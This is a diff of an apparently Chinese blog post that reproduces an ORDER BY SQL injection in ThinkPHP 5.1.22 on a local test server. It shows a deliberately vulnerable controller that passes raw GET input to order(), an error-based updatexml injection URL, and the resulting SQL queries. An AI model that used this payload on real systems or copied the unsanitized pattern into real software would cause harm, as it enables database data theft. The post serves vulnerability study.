@@ -25,8 +25,10 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/18/UY7RFc62jeCwI85.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/18/uTyOYQFE7ZtJ3U9.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/18/kxIXJGzZoajCcU2.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/uS13RQPTC8xkwre.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/18/6Ypa1Z4FlKwGfBm.png">
-<meta property="og:updated_time" content="2019-11-18T07:44:40.088Z">
+<meta property="og:image" content="https://i.loli.net/2019/12/01/Aj75BswcRNZLKEk.png">
+<meta property="og:updated_time" content="2019-12-01T01:02:20.653Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkPHP 3.X&#x2F;5.X order by注入漏洞复现">
 <meta name="twitter:image" content="https://i.loli.net/2019/11/18/gvTxcPEQlMiBZdI.png">
@@ -215,9 +217,13 @@
 <h4 id="一、获取漏洞-1"><a href="#一、获取漏洞-1" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p><code>TP5.1.22</code></p>
 <p>我之前复现<code>RCE</code>的还在😁</p>
 <p><code>application/index/controller/Index.php</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Home\Controller;</span><br><span class="line">use Think\Controller;</span><br><span class="line">class IndexController extends Controller &#123;</span><br><span class="line">    public function index()&#123;</span><br><span class="line">        $data = array();</span><br><span class="line">        $data[&apos;username&apos;] = array(&apos;eq&apos;,&apos;admin&apos;);</span><br><span class="line">        $order = input(&apos;get.order&apos;);</span><br><span class="line">        $m = db(&apos;user&apos;)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">        dump($m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line">use think\Controller;</span><br><span class="line">class Index extends Controller &#123;</span><br><span class="line">    public function index()&#123;</span><br><span class="line">        $data = array();</span><br><span class="line">        $data[&apos;username&apos;] = array(&apos;eq&apos;,&apos;admin&apos;);</span><br><span class="line">        $order = input(&apos;get.order&apos;);</span><br><span class="line">        $m = db(&apos;user&apos;)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">        dump($m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>这里需要把php版本切到5.6及以上</strong></p>
+<p><strong>控制器的定义语句略有不同，具体参考开发手册，很香</strong></p>
+<blockquote>
+<p><a href="https://www.kancloud.cn/manual/thinkphp5_1/353979" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5_1/353979</a> </p>
+</blockquote>
 <h4 id="二、漏洞实现-1"><a href="#二、漏洞实现-1" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5.1.22/public/index.php/Index/index?order[username`|updatexml(1,concat(0x3a,user()),1)%23]=1</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/11/18/UY7RFc62jeCwI85.png" alt="Snipaste_2019-11-18_10-58-52.png"></p>
@@ -226,10 +232,17 @@
 <p>将传入的<code>field数组</code>直接<code>array_merge()</code>到<code>$this-&gt;options[&#39;order&#39;]</code></p>
 <p>调试一下看看</p>
 <p><img src="https://i.loli.net/2019/11/18/kxIXJGzZoajCcU2.png" alt="Snipaste_2019-11-18_11-17-08.png"></p>
+<p><code>thinkphp/library/think/db/Builder.php</code>中的<code>parseOrder()</code>函数</p>
+<p><img src="https://i.loli.net/2019/12/01/uS13RQPTC8xkwre.png" alt="Snipaste_2019-12-01_08-50-45.png"></p>
 <p>跟踪最后的sql语句</p>
 <p><img src="https://i.loli.net/2019/11/18/6Ypa1Z4FlKwGfBm.png" alt="Snipaste_2019-11-18_11-21-51.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `think_user` WHERE  `username` IN (:where_AND_username_in_1,:where_AND_username_in_2) ORDER BY `username`|updatexml(1,concat(0x3a,user()),1)#` LIMIT 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `think_user` WHERE  `username` IN (:where_AND_username_in_1,:where_AND_username_in_2) ORDER BY `username`||updatexml(1,concat(0x3a,user()),1)#` LIMIT 1</span><br></pre></td></tr></table></figure>
 
+<p>其中<code>:where_AND_username_in_1,:where_AND_username_in_2</code>会通过参数绑定的形式传入</p>
+<p><img src="https://i.loli.net/2019/12/01/Aj75BswcRNZLKEk.png" alt="Snipaste_2019-12-01_09-01-31.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `think_user` WHERE `username` IN (&apos;eq&apos;,&apos;admin&apos;) ORDER BY `username`|updatexml(1,concat(0x3a,user()),1)#` LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里的|操作符我好像第一次用到。。</strong></p>
 <h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a> </p>
 
       
